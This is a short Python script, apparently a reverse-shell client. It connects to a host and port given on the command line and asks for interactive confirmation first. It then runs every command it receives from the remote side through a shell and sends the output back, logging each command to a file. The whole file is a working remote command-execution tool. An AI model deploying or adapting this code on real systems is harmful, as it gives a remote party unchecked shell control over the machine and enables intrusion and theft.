import logging
import os
import subprocess
import time
from colorama import Fore
import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST: str = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT: int = sys.argv[2] if len(sys.argv) > 2 else 9090


while True:
    Connect = input(Fore.LIGHTRED_EX + f"Do you want to connect {HOST}:{PORT} (Y/n): ")
    if Connect == "n" or Connect == "N":
        break
    try:
        print(Fore.CYAN + f"\nTrying to connect {HOST}:{PORT}")
        s.connect((HOST, PORT))
        print(Fore.BLUE + f"[+] {s.recv(1024).decode()}")
        while True:
            cmd = s.recv(1024).decode()
            if cmd.lower() in ["q", "exit", "quit"]:
                print(Fore.LIGHTRED_EX + "Quitting...")
                output = "Quitting..."
                break
            print(Fore.YELLOW + f"[*] Recieve: {cmd}")
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as err:
                output = str(err).encode()
            logging.basicConfig(level=logging.DEBUG, filename="client.log")
            logging.debug(cmd)
            s.send(output)
        s.close()
        break

    except ConnectionRefusedError as CRE:
        pass
        # Retried = 0
        # if Retried < 5:
        #     Retried+=1
        #     pass

        # TryingToReconnect = 0
        # while TryingToReconnect < 3:
        #     print(Fore.CYAN + "[*] Reconnecting...")
        #     time.sleep(3)
        #     TryingToReconnect+=1
        #     pass

        # break
        # for TryingToReconnect in range(30):
        #     if TryingToReconnect <=30:
        #         print(Fore.CYAN + "[*] Reconnecting...")
        #         time.sleep(3)
        #         pass
        #     else:
        #         break

